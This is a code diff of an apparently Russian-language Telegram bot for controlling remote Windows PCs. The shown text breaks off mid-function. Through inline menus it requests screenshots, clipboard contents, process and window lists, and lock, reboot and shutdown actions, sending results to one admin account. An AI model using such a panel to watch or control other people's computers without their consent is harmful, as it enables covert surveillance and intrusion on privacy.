@@ -1,719 +1,508 @@
-# main.py - MQTT Server + Telegram Bot с .env
-import paho.mqtt.client as mqtt
-import json
+import asyncio
+import os
+import base64
 import sqlite3
 import time
-import os
-import asyncio
-import threading
-import logging
-import sys
-from datetime import datetime
-import base64
-from typing import Dict, List, Optional, Any
-from aiogram import Bot, Dispatcher, types
+from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
+from dotenv import load_dotenv
 
-# Пытаемся загрузить dotenv, если он есть
-try:
-    from dotenv import load_dotenv
-    load_dotenv()
-    logger_env = logging.getLogger(__name__)
-    logger_env.info("✅ .env файл загружен")
-except ImportError:
-    # Если dotenv не установлен, просто используем os.environ
-    pass
+load_dotenv()
+TOKEN = os.getenv("BOT_TOKEN")
+ADMIN_ID = 5153650495
+CHANNEL_USERNAME = "hurghgruuruhgrughuhgur47846776v7" 
 
-# ============ НАСТРОЙКА ЛОГИРОВАНИЯ ============
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s',
-    datefmt='%H:%M:%S'
-)
-logger = logging.getLogger(__name__)
+bot = Bot(token=TOKEN)
+dp = Dispatcher()
 
-# ============ КОНФИГУРАЦИЯ ============
+screenshot_buffers = {}
 
-# MQTT - берем из переменных окружения или используем значения по умолчанию
-MQTT_CONFIG = {
-    "host": os.getenv("MQTT_HOST", "04f19c56c4b441a68aa08dafd39d7713.s1.eu.hivemq.cloud"),
-    "port": int(os.getenv("MQTT_PORT", "8883")),
-    "username": os.getenv("MQTT_USERNAME", "admin"),
-    "password": os.getenv("MQTT_PASSWORD", "your_password_here")
-}
-
-# Telegram - берем из переменных окружения
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_ID = int(os.getenv("ADMIN_ID", "5153650495"))
-
-# ============ ПРОВЕРКА НАСТРОЕК ============
-if not BOT_TOKEN:
-    logger.error("=" * 60)
-    logger.error("❌ BOT_TOKEN не найден в переменных окружения!")
-    logger.error("")
-    logger.error("Способы решения:")
-    logger.error("1. Создайте файл .env в папке с проектом:")
-    logger.error("   BOT_TOKEN=ваш_токен_бота")
-    logger.error("   ADMIN_ID=5153650495")
-    logger.error("   MQTT_PASSWORD=ваш_пароль")
-    logger.error("")
-    logger.error("2. Или установите переменные окружения:")
-    logger.error("   export BOT_TOKEN='ваш_токен_бота'")
-    logger.error("   export ADMIN_ID='5153650495'")
-    logger.error("=" * 60)
-    sys.exit(1)
-
-if MQTT_CONFIG["password"] == "your_password_here":
-    logger.warning("⚠️ Используется пароль MQTT по умолчанию!")
-    logger.warning("   Установите MQTT_PASSWORD в .env или переменных окружения")
-
-# ============ БАЗА ДАННЫХ ============
+# --- БАЗА ДАННЫХ ---
 DB_PATH = os.path.join(os.path.dirname(__file__), "devices.db")
 
 def init_db():
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
-    
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS devices (
             device_id TEXT PRIMARY KEY,
             name TEXT,
             last_seen INTEGER,
-            first_seen INTEGER,
-            os_info TEXT,
-            ip_address TEXT,
-            is_online INTEGER DEFAULT 0
+            is_notified INTEGER DEFAULT 0
         )
     """)
-    
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS command_history (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            device_id TEXT,
-            command TEXT,
-            result TEXT,
-            timestamp INTEGER,
-            status TEXT
-        )
-    """)
-    
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS screenshots (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            device_id TEXT,
-            image_data TEXT,
-            timestamp INTEGER,
-            filename TEXT
-        )
-    """)
-    
     conn.commit()
     conn.close()
-    logger.info("📦 Database initialized")
+
+def update_device_in_db(device_id, name, is_notified=None):
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    current_time = int(time.time())
+    
+    cursor.execute("SELECT is_notified FROM devices WHERE device_id = ?", (device_id,))
+    row = cursor.fetchone()
+    
+    if row is None:
+        notif = is_notified if is_notified is not None else 0
+        cursor.execute("INSERT INTO devices (device_id, name, last_seen, is_notified) VALUES (?, ?, ?, ?)",
+                       (device_id, name, current_time, notif))
+    else:
+        if is_notified is not None:
+            cursor.execute("UPDATE devices SET name = ?, last_seen = ?, is_notified = ? WHERE device_id = ?",
+                           (name, current_time, is_notified, device_id))
+        else:
+            cursor.execute("UPDATE devices SET name = ?, last_seen = ? WHERE device_id = ?",
+                           (name, current_time, device_id))
+        
+    conn.commit()
+    conn.close()
 
 def get_all_devices():
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
-    cursor.execute("SELECT device_id, name, last_seen, is_online, os_info FROM devices ORDER BY last_seen DESC")
-    devices = cursor.fetchall()
+    cursor.execute("SELECT device_id, name, last_seen FROM devices")
+    rows = cursor.fetchall()
     conn.close()
-    return devices
+    return rows
 
-def get_device(device_id: str):
+def get_device(device_id):
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
-    cursor.execute("SELECT device_id, name, last_seen, is_online, os_info FROM devices WHERE device_id = ?", (device_id,))
-    device = cursor.fetchone()
+    cursor.execute("SELECT name, last_seen, is_notified FROM devices WHERE device_id = ?", (device_id,))
+    row = cursor.fetchone()
     conn.close()
-    return device
+    return row
 
-def update_device(device_id: str, name: str, os_info: str = None):
-    conn = sqlite3.connect(DB_PATH)
-    cursor = conn.cursor()
-    current_time = int(time.time())
-    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
-    existing = cursor.fetchone()
-    if existing:
-        cursor.execute("UPDATE devices SET name = ?, last_seen = ?, os_info = ?, is_online = 1 WHERE device_id = ?",
-                       (name, current_time, os_info, device_id))
-    else:
-        cursor.execute("INSERT INTO devices (device_id, name, last_seen, first_seen, os_info, is_online) VALUES (?, ?, ?, ?, ?, 1)",
-                       (device_id, name, current_time, current_time, os_info))
-    conn.commit()
-    conn.close()
-
-def set_device_offline(device_id: str):
-    conn = sqlite3.connect(DB_PATH)
-    cursor = conn.cursor()
-    cursor.execute("UPDATE devices SET is_online = 0 WHERE device_id = ?", (device_id,))
-    conn.commit()
-    conn.close()
-
-def delete_device(device_id: str):
+def delete_device(device_id):
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
     cursor.execute("DELETE FROM devices WHERE device_id = ?", (device_id,))
-    cursor.execute("DELETE FROM command_history WHERE device_id = ?", (device_id,))
-    cursor.execute("DELETE FROM screenshots WHERE device_id = ?", (device_id,))
     conn.commit()
     conn.close()
 
-def save_command_history(device_id: str, command: str, result: str = None, status: str = "pending"):
-    conn = sqlite3.connect(DB_PATH)
-    cursor = conn.cursor()
-    cursor.execute("INSERT INTO command_history (device_id, command, result, timestamp, status) VALUES (?, ?, ?, ?, ?)",
-                   (device_id, command, result, int(time.time()), status))
-    conn.commit()
-    conn.close()
-
-def save_screenshot(device_id: str, image_data: str) -> str:
-    try:
-        image_bytes = base64.b64decode(image_data)
-        os.makedirs("screenshots", exist_ok=True)
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"screenshots/screenshot_{device_id[:8]}_{timestamp}.jpg"
-        with open(filename, 'wb') as f:
-            f.write(image_bytes)
-        conn = sqlite3.connect(DB_PATH)
-        cursor = conn.cursor()
-        cursor.execute("INSERT INTO screenshots (device_id, image_data, timestamp, filename) VALUES (?, ?, ?, ?)",
-                       (device_id, image_data, int(time.time()), filename))
-        conn.commit()
-        conn.close()
-        logger.info(f"📸 Screenshot saved: {filename}")
-        return filename
-    except Exception as e:
-        logger.error(f"Error saving screenshot: {e}")
-        return None
-
-# ============ КЛАВИАТУРЫ ДЛЯ TELEGRAM ============
-
+# --- ИНТЕРФЕЙС ---
 def get_main_menu():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📋 Список устройств", callback_data="list_devices")],
-        [InlineKeyboardButton(text="📊 Статистика", callback_data="stats")],
+        [InlineKeyboardButton(text="📋 Список устройств", callback_data="back_to_list")],
+        [InlineKeyboardButton(text="📊 Статистика системы", callback_data="global_stats")],
         [InlineKeyboardButton(text="🗑 Очистить оффлайн", callback_data="clean_offline")]
     ])
 
 def get_device_menu(device_id: str):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📸 Скриншот", callback_data=f"cmd_{device_id}_screenshot")],
-        [InlineKeyboardButton(text="💻 Системная информация", callback_data=f"cmd_{device_id}_sysinfo")],
-        [InlineKeyboardButton(text="📋 Список процессов", callback_data=f"cmd_{device_id}_tasklist")],
-        [InlineKeyboardButton(text="🌐 Сетевая информация", callback_data=f"cmd_{device_id}_netinfo")],
-        [InlineKeyboardButton(text="🔋 Батарея", callback_data=f"cmd_{device_id}_battery")],
-        [InlineKeyboardButton(text="⚙️ Системные действия", callback_data=f"sys_actions_{device_id}")],
-        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+        [InlineKeyboardButton(text="📊 Инфо и Мониторинг", callback_data=f"cat_mon_{device_id}")],
+        [InlineKeyboardButton(text="⚙️ Системные действия", callback_data=f"cat_sys_{device_id}")],
+        [InlineKeyboardButton(text="🌐 Открытие ресурсов", callback_data=f"cat_web_{device_id}")],
+        [InlineKeyboardButton(text="🛠 Утилиты и Приложения", callback_data=f"cat_util_{device_id}")],
+        [InlineKeyboardButton(text="🔍 Дополнительно", callback_data=f"cat_extra_{device_id}")],
+        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data="go_to_main_start")]
     ])
 
-def get_system_actions_menu(device_id: str):
+def get_monitoring_menu(device_id):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔒 Блокировка", callback_data=f"cmd_{device_id}_lock")],
-        [InlineKeyboardButton(text="🌙 Сон", callback_data=f"cmd_{device_id}_sleep")],
-        [InlineKeyboardButton(text="🔄 Перезагрузка", callback_data=f"cmd_{device_id}_reboot")],
-        [InlineKeyboardButton(text="🛑 Выключение", callback_data=f"cmd_{device_id}_shutdown")],
-        [InlineKeyboardButton(text="🔊 Громкость MAX", callback_data=f"cmd_{device_id}_volmax")],
-        [InlineKeyboardButton(text="📝 Блокнот", callback_data=f"cmd_{device_id}_notepad")],
-        [InlineKeyboardButton(text="🧮 Калькулятор", callback_data=f"cmd_{device_id}_calc")],
-        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"device_{device_id}")]
+        [InlineKeyboardButton(text="📸 Скриншот", callback_data=f"cmd_screen_{device_id}")],
+        [InlineKeyboardButton(text="📋 Процессы", callback_data=f"cmd_tasklist_{device_id}")],
+        [InlineKeyboardButton(text="📱 Открытые окна", callback_data=f"cmd_apps_{device_id}")],
+        [InlineKeyboardButton(text="🪟 Активное окно", callback_data=f"cmd_activewin_{device_id}")],
+        [InlineKeyboardButton(text="📋 Буфер обмена", callback_data=f"cmd_clipboard_{device_id}")],
+        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
     ])
 
-# ============ MQTT СЕРВЕР ============
-class MQTTDeviceServer:
-    def __init__(self, bot: Bot = None):
-        self.client = mqtt.Client(client_id="server_admin", protocol=mqtt.MQTTv311)
-        self.client.tls_set()
-        self.client.username_pw_set(MQTT_CONFIG["username"], MQTT_CONFIG["password"])
-        self.client.on_connect = self.on_connect
-        self.client.on_message = self.on_message
-        self.client.on_disconnect = self.on_disconnect
-        self.online_devices = set()
-        self.pending_commands = {}
-        self.running = True
-        self.base_topic = "devices"
-        self.bot = bot
-        logger.info("🚀 MQTT Server initialized")
-    
-    def on_connect(self, client, userdata, flags, rc):
-        if rc == 0:
-            logger.info("✅ Connected to HiveMQ Cloud!")
-            topics = [f"{self.base_topic}/+/status", f"{self.base_topic}/+/response", 
-                      f"{self.base_topic}/+/screenshot", f"{self.base_topic}/+/ping", f"{self.base_topic}/+/info"]
-            for topic in topics:
-                self.client.subscribe(topic, qos=1)
-                logger.info(f"📡 Subscribed to: {topic}")
-            threading.Thread(target=self.check_offline_devices, daemon=True).start()
-        else:
-            logger.error(f"❌ Connection failed with code: {rc}")
-    
-    def on_disconnect(self, client, userdata, rc):
-        logger.warning("⚠️ Disconnected from HiveMQ Cloud")
-        if self.running:
-            logger.info("🔄 Reconnecting in 5 seconds...")
-            time.sleep(5)
-            self.connect()
-    
-    def on_message(self, client, userdata, msg):
-        try:
-            topic = msg.topic
-            parts = topic.split('/')
-            if len(parts) < 3:
-                return
-            device_id = parts[1]
-            msg_type = parts[2]
-            payload = msg.payload.decode('utf-8')
-            
-            handlers = {
-                'status': self.handle_status,
-                'ping': self.handle_ping,
-                'response': self.handle_response,
-                'screenshot': self.handle_screenshot,
-                'info': self.handle_info
-            }
-            if msg_type in handlers:
-                handlers[msg_type](device_id, payload)
-        except Exception as e:
-            logger.error(f"Error processing message: {e}")
-    
-    def handle_status(self, device_id: str, payload: str):
-        try:
-            data = json.loads(payload)
-            name = data.get('name', 'Unknown')
-            os_info = data.get('os', 'Unknown')
-            update_device(device_id, name, os_info)
-            self.online_devices.add(device_id)
-            logger.info(f"🟢 {name} ({device_id[:8]}) подключен")
-            
-            if self.bot:
-                asyncio.create_task(self.send_telegram_notification(f"🟢 Устройство подключено: {name}"))
-            
-            if device_id in self.pending_commands:
-                for cmd in self.pending_commands[device_id]:
-                    self.send_command(device_id, cmd)
-                self.pending_commands[device_id] = []
-        except json.JSONDecodeError:
-            logger.error(f"Invalid JSON in status from {device_id}")
-    
-    def handle_ping(self, device_id: str, payload: str):
-        try:
-            data = json.loads(payload)
-            name = data.get('name', 'Unknown')
-            update_device(device_id, name)
-            self.online_devices.add(device_id)
-            logger.debug(f"📡 Ping from {device_id[:8]}")
-        except Exception as e:
-            logger.error(f"Ping error: {e}")
-    
-    def handle_response(self, device_id: str, payload: str):
-        try:
-            data = json.loads(payload)
-            command = data.get('command', '')
-            result = data.get('result', '')
-            result_str = json.dumps(result, indent=2, ensure_ascii=False)
-            save_command_history(device_id, command, result_str, "completed")
-            
-            if self.bot:
-                device = get_device(device_id)
-                name = device[1] if device else device_id[:8]
-                
-                if command == "screenshot":
-                    pass
-                else:
-                    text = f"📌 Результат команды *{command}*\n"
-                    text += f"🖥 Устройство: *{name}*\n\n"
-                    if isinstance(result, dict):
-                        for key, value in result.items():
-                            if isinstance(value, (dict, list)):
-                                text += f"*{key}:*\n```json\n{json.dumps(value, indent=2, ensure_ascii=False)}\n```\n"
-                            else:
-                                text += f"*{key}:* {value}\n"
-                    else:
-                        text += f"```\n{result}\n```"
-                    
-                    asyncio.create_task(self.send_telegram_message(text))
-            
-            self.display_result(device_id, command, result)
-        except Exception as e:
-            logger.error(f"Response error: {e}")
-    
-    def handle_screenshot(self, device_id: str, payload: str):
-        try:
-            filename = save_screenshot(device_id, payload)
-            if filename:
-                device = get_device(device_id)
-                name = device[1] if device else device_id[:8]
-                
-                if self.bot:
-                    try:
-                        image_bytes = base64.b64decode(payload)
-                        asyncio.create_task(
-                            self.send_telegram_photo(
-                                image_bytes, 
-                                f"📸 Скриншот с ПК: *{name}*"
-                            )
-                        )
-                    except Exception as e:
-                        logger.error(f"Error sending screenshot to Telegram: {e}")
-                
-                print("\n" + "="*60)
-                print(f"📸 СКРИНШОТ ПОЛУЧЕН")
-                print(f"🖥 Устройство: {name}")
-                print(f"📁 Файл: {filename}")
-                print("="*60 + "\n")
-        except Exception as e:
-            logger.error(f"Screenshot error: {e}")
-    
-    def handle_info(self, device_id: str, payload: str):
-        try:
-            data = json.loads(payload)
-            name = data.get('name', 'Unknown')
-            os_info = data.get('os', 'Unknown')
-            update_device(device_id, name, os_info)
-            
-            if self.bot:
-                text = f"💻 *Системная информация*\n"
-                text += f"🖥 Устройство: *{name}*\n\n"
-                for key, value in data.items():
-                    if key == 'memory':
-                        text += f"*Память:*\n"
-                        for k, v in value.items():
-                            text += f"  {k}: {v}\n"
-                    elif key == 'disks':
-                        text += f"*Диски:*\n"
-                        for disk in value:
-                            text += f"  {disk['drive']}: {disk['total_gb']}GB, свободно: {disk['free_gb']}GB\n"
-                    else:
-                        text += f"*{key}:* {value}\n"
-                
-                asyncio.create_task(self.send_telegram_message(text))
-            
-            print("\n" + "="*60)
-            print(f"💻 СИСТЕМНАЯ ИНФОРМАЦИЯ")
-            print(f"🖥 Устройство: {name}")
-            print("="*60)
-            for key, value in data.items():
-                if key in ['memory', 'disks']:
-                    print(f"  {key}:")
-                    for k, v in value.items():
-                        print(f"    {k}: {v}")
-                else:
-                    print(f"  {key}: {value}")
-            print("="*60 + "\n")
-        except Exception as e:
-            logger.error(f"Info error: {e}")
-    
-    def send_command(self, device_id: str, command: str) -> bool:
-        try:
-            topic = f"{self.base_topic}/{device_id}/command"
-            if device_id not in self.online_devices:
-                if device_id not in self.pending_commands:
-                    self.pending_commands[device_id] = []
-                self.pending_commands[device_id].append(command)
-                logger.info(f"💾 Command '{command}' saved for offline device {device_id[:8]}")
-                save_command_history(device_id, command, None, "queued")
-                return True
-            payload = json.dumps({'command': command, 'timestamp': int(time.time())})
-            result = self.client.publish(topic, payload, qos=1)
-            if result.rc == mqtt.MQTT_ERR_SUCCESS:
-                save_command_history(device_id, command, None, "sent")
-                logger.info(f"🚀 Command '{command}' sent to {device_id[:8]}")
-                return True
-            return False
-        except Exception as e:
-            logger.error(f"Send command error: {e}")
-            return False
-    
-    def display_result(self, device_id: str, command: str, result: Any):
-        device = get_device(device_id)
-        name = device[1] if device else device_id[:8]
-        print("\n" + "="*60)
-        print(f"📌 РЕЗУЛЬТАТ КОМАНДЫ")
-        print(f"🖥 Устройство: {name}")
-        print(f"📋 Команда: {command}")
-        print("="*60)
-        if isinstance(result, dict):
-            for key, value in result.items():
-                if key == 'screenshot':
-                    print(f"  {key}: <base64 image>")
-                elif key == 'error':
-                    print(f"  ❌ {key}: {value}")
-                elif isinstance(value, (dict, list)):
-                    print(f"  {key}:")
-                    print(json.dumps(value, indent=4, ensure_ascii=False))
-                else:
-                    print(f"  {key}: {value}")
-        else:
-            print(f"  {result}")
-        print("="*60 + "\n")
-    
-    def check_offline_devices(self):
-        while self.running:
-            try:
-                time.sleep(30)
-                devices = get_all_devices()
-                current_time = int(time.time())
-                for device_id, name, last_seen, is_online, _ in devices:
-                    if current_time - last_seen > 120 and is_online:
-                        set_device_offline(device_id)
-                        self.online_devices.discard(device_id)
-                        logger.info(f"🔴 {name} ({device_id[:8]}) перешел в оффлайн")
-                        
-                        if self.bot:
-                            asyncio.create_task(self.send_telegram_notification(f"🔴 Устройство отключилось: {name}"))
-            except Exception as e:
-                logger.error(f"Check offline error: {e}")
-    
-    def connect(self) -> bool:
-        try:
-            self.client.connect(MQTT_CONFIG["host"], MQTT_CONFIG["port"], 60)
-            self.client.loop_start()
-            return True
-        except Exception as e:
-            logger.error(f"❌ Connection error: {e}")
-            return False
-    
-    def disconnect(self):
-        self.running = False
-        self.client.loop_stop()
-        self.client.disconnect()
-        logger.info("👋 Disconnected")
-    
-    # ============ TELEGRAM HELPERS ============
-    
-    async def send_telegram_message(self, text: str):
-        if self.bot:
-            try:
-                await self.bot.send_message(ADMIN_ID, text, parse_mode="Markdown")
-            except Exception as e:
-                logger.error(f"Error sending Telegram message: {e}")
-    
-    async def send_telegram_photo(self, image_bytes: bytes, caption: str = ""):
-        if self.bot:
-            try:
-                await self.bot.send_photo(
-                    ADMIN_ID,
-                    BufferedInputFile(image_bytes, filename="screenshot.jpg"),
-                    caption=caption,
-                    parse_mode="Markdown"
-                )
-            except Exception as e:
-                logger.error(f"Error sending Telegram photo: {e}")
-    
-    async def send_telegram_notification(self, text: str):
-        if self.bot:
-            try:
-                await self.bot.send_message(ADMIN_ID, f"🔔 {text}")
-            except Exception as e:
-                logger.error(f"Error sending notification: {e}")
+def get_system_menu(device_id):
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔒 Блок экрана", callback_data=f"cmd_lock_{device_id}")],
+        [InlineKeyboardButton(text="🌙 Сон", callback_data=f"cmd_sleep_{device_id}")],
+        [InlineKeyboardButton(text="🔄 Перезагрузка", callback_data=f"cmd_reboot_{device_id}")],
+        [InlineKeyboardButton(text="🛑 Выключение", callback_data=f"cmd_shutdown_{device_id}")],
+        [InlineKeyboardButton(text="🔊 Звук макс.", callback_data=f"cmd_volmax_{device_id}")],
+        [InlineKeyboardButton(text="🔇 Отключить звук", callback_data=f"cmd_mute_{device_id}")],
+        [InlineKeyboardButton(text="🔊 Включить звук", callback_data=f"cmd_unmute_{device_id}")],
+        [InlineKeyboardButton(text="💡 Яркость 50%", callback_data=f"cmd_brightness50_{device_id}")],
+        [InlineKeyboardButton(text="💡 Яркость 100%", callback_data=f"cmd_brightness100_{device_id}")],
+        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
+    ])
 
-# ============ TELEGRAM БОТ ============
+def get_web_menu(device_id):
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🌐 YouTube", callback_data=f"cmd_yt_{device_id}")],
+        [InlineKeyboardButton(text="🔍 Google", callback_data=f"cmd_google_{device_id}")],
+        [InlineKeyboardButton(text="🗺 Карты", callback_data=f"cmd_maps_{device_id}")],
+        [InlineKeyboardButton(text="💬 Сообщение", callback_data=f"cmd_msg_{device_id}")],
+        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
+    ])
 
-def setup_bot_handlers(dp: Dispatcher, mqtt_server: MQTTDeviceServer):
+def get_util_menu(device_id):
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🧮 Калькулятор", callback_data=f"cmd_calc_{device_id}")],
+        [InlineKeyboardButton(text="📝 Блокнот", callback_data=f"cmd_notepad_{device_id}")],
+        [InlineKeyboardButton(text="🎨 Paint", callback_data=f"cmd_paint_{device_id}")],
+        [InlineKeyboardButton(text="⏳ Скринывер", callback_data=f"cmd_scr_{device_id}")],
+        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
+    ])
+
+def get_extra_menu(device_id):
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="💻 Системная инфо", callback_data=f"cmd_sysinfo_{device_id}")],
+        [InlineKeyboardButton(text="🌐 Сетевая инфо", callback_data=f"cmd_netinfo_{device_id}")],
+        [InlineKeyboardButton(text="🔋 Батарея", callback_data=f"cmd_battery_{device_id}")],
+        [InlineKeyboardButton(text="🔄 Точка восстановления", callback_data=f"cmd_restore_{device_id}")],
+        [InlineKeyboardButton(text="🔓 Разблокировать приложения", callback_data=f"cmd_unblock_{device_id}")],
+        [InlineKeyboardButton(text="🗑 Удалить устройство", callback_data=f"delete_{device_id}")],
+        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
+    ])
+
+# --- ОБРАБОТЧИКИ КОМАНД ---
+
+@dp.message(Command("start"))
+async def cmd_start(message: types.Message):
+    if message.from_user.id != ADMIN_ID: return
+    await message.answer("🤖 Панель управления Windows v2.0\nВсе данные сохранены в БД.", reply_markup=get_main_menu())
+
+@dp.callback_query(F.data == "go_to_main_start")
+async def go_to_main_start(callback: types.CallbackQuery):
+    text = "🤖 **Главное меню**"
+    markup = get_main_menu()
     
-    @dp.message(Command("start"))
-    async def cmd_start(message: types.Message):
-        if message.from_user.id != ADMIN_ID:
-            await message.answer("❌ Доступ запрещен")
-            return
-        await message.answer(
-            "🤖 MQTT Device Manager\n"
-            "Управляйте своими устройствами через Telegram",
-            reply_markup=get_main_menu()
-        )
+    if callback.message.photo or callback.message.document:
+        await callback.message.edit_caption(caption=text, parse_mode="Markdown", reply_markup=markup)
+    else:
+        await callback.message.edit_text(text=text, parse_mode="Markdown", reply_markup=markup)
+
+@dp.callback_query(F.data == "back_to_list")
+async def show_devices_callback(callback: types.CallbackQuery):
+    devices = get_all_devices()
+    if not devices:
+        await callback.message.edit_text("❌ Список устройств пуст.", reply_markup=get_main_menu())
+        return
     
-    @dp.callback_query(lambda c: c.data == "main_menu")
-    async def main_menu(callback: types.CallbackQuery):
-        if callback.from_user.id != ADMIN_ID:
-            await callback.answer("❌ Доступ запрещен")
-            return
-        await callback.message.edit_text(
-            "🤖 Главное меню",
-            reply_markup=get_main_menu()
-        )
-        await callback.answer()
+    keyboard = []
+    current_time = int(time.time())
     
-    @dp.callback_query(lambda c: c.data == "list_devices")
-    async def list_devices(callback: types.CallbackQuery):
-        if callback.from_user.id != ADMIN_ID:
-            await callback.answer("❌ Доступ запрещен")
-            return
-        
-        devices = get_all_devices()
-        if not devices:
-            await callback.message.edit_text(
-                "❌ Нет подключенных устройств",
-                reply_markup=get_main_menu()
-            )
-            await callback.answer()
-            return
-        
-        text = "📋 *Список устройств:*\n\n"
-        keyboard = []
-        
-        for device_id, name, last_seen, is_online, os_info in devices:
-            status = "🟢 Онлайн" if is_online else "🔴 Оффлайн"
-            last = datetime.fromtimestamp(last_seen).strftime("%H:%M:%S")
-            text += f"{status} *{name}*\n"
-            text += f"  ID: `{device_id[:8]}...`\n"
-            text += f"  Последнее: {last}\n\n"
-            keyboard.append([InlineKeyboardButton(
-                text=f"{status} {name}",
-                callback_data=f"device_{device_id}"
-            )])
-        
-        keyboard.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")])
-        
-        await callback.message.edit_text(
-            text,
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
-        )
-        await callback.answer()
+    for dev_id, name, last_seen in devices:
+        status_emoji = "🟢" if current_time - last_seen < 180 else "🔴"
+        keyboard.append([InlineKeyboardButton(text=f"{status_emoji} {name}", callback_data=f"manage_{dev_id}")])
     
-    @dp.callback_query(lambda c: c.data.startswith("device_"))
-    async def device_menu(callback: types.CallbackQuery):
-        if callback.from_user.id != ADMIN_ID:
-            await callback.answer("❌ Доступ запрещен")
-            return
-        
-        device_id = callback.data.replace("device_", "")
-        device = get_device(device_id)
-        if not device:
-            await callback.answer("❌ Устройство не найдено")
-            return
-        
-        status = "🟢 Онлайн" if device[3] else "🔴 Оффлайн"
-        text = f"💻 *{device[1]}*\n"
-        text += f"Статус: {status}\n"
-        text += f"🆔 ID: `{device_id}`\n"
-        text += f"💿 ОС: {device[4] or 'Неизвестно'}\n"
-        
-        await callback.message.edit_text(
-            text,
+    keyboard.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="go_to_main_start")])
+    
+    await callback.message.edit_text("🎛 **Список устройств из Базы Данных:**", parse_mode="Markdown", 
+                                   reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
+
+@dp.callback_query(F.data == "global_stats")
+async def global_stats(callback: types.CallbackQuery):
+    devices = get_all_devices()
+    total = len(devices)
+    online = 0
+    current_time = int(time.time())
+    
+    for dev_id, name, last_seen in devices:
+        if current_time - last_seen < 180:
+            online += 1
+    
+    text = f"📊 **Глобальная статистика:**\n"
+    text += f"• Всего устройств: {total}\n"
+    text += f"• Онлайн: {online}\n"
+    text += f"• Оффлайн: {total - online}\n"
+    text += f"• Активность: {int(online/total*100) if total > 0 else 0}%"
+    
+    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=get_main_menu())
+
+@dp.callback_query(F.data == "clean_offline")
+async def clean_offline(callback: types.CallbackQuery):
+    devices = get_all_devices()
+    current_time = int(time.time())
+    deleted = 0
+    
+    for dev_id, name, last_seen in devices:
+        if current_time - last_seen >= 180:
+            delete_device(dev_id)
+            deleted += 1
+    
+    await callback.answer(f"🗑 Удалено {deleted} оффлайн устройств")
+    
+    # Обновляем список
+    devices = get_all_devices()
+    if not devices:
+        await callback.message.edit_text("✅ Все оффлайн устройства удалены.", reply_markup=get_main_menu())
+        return
+    
+    keyboard = []
+    for dev_id, name, last_seen in devices:
+        status_emoji = "🟢" if current_time - last_seen < 180 else "🔴"
+        keyboard.append([InlineKeyboardButton(text=f"{status_emoji} {name}", callback_data=f"manage_{dev_id}")])
+    
+    await callback.message.edit_text("🎛 **Обновленный список устройств:**", parse_mode="Markdown", 
+                                   reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
+
+@dp.callback_query(F.data.startswith("manage_"))
+async def manage_device(callback: types.CallbackQuery):
+    device_id = callback.data.split("_")[1]
+    device_info = get_device(device_id)
+    if not device_info: 
+        await callback.answer("❌ Устройство удалено или не найдено.")
+        return
+    
+    current_time = int(time.time())
+    status_str = "🟢 Онлайн" if current_time - device_info[1] < 180 else "🔴 Оффлайн"
+    
+    text = f"💻 Управление ПК: *{device_info[0]}*\nСтатус: {status_str}\n🆔 ID: `{device_id}`"
+    markup = get_device_menu(device_id)
+    
+    if callback.message.photo or callback.message.document:
+        await callback.message.edit_caption(caption=text, parse_mode="Markdown", reply_markup=markup)
+    else:
+        await callback.message.edit_text(text=text, parse_mode="Markdown", reply_markup=markup)
+
+@dp.callback_query(F.data.startswith("delete_"))
+async def delete_device_callback(callback: types.CallbackQuery):
+    device_id = callback.data.split("_")[1]
+    device_info = get_device(device_id)
+    if device_info:
+        delete_device(device_id)
+        await callback.answer(f"✅ Устройство {device_info[0]} удалено")
+    else:
+        await callback.answer("❌ Устройство не найдено")
+    
+    # Возвращаемся к списку
+    await show_devices_callback(callback)
+
+@dp.callback_query(F.data.startswith("cat_"))
+async def handle_categories(callback: types.CallbackQuery):
+    data = callback.data.split("_")
+    cat, dev_id = data[1], data[2]
+    
+    text = ""
+    markup = None
+    
+    if cat == "mon":
+        text = "📊 **Мониторинг**"
+        markup = get_monitoring_menu(dev_id)
+    elif cat == "sys":
+        text = "⚙️ **Системные действия**"
+        markup = get_system_menu(dev_id)
+    elif cat == "web":
+        text = "🌐 **Ресурсы**"
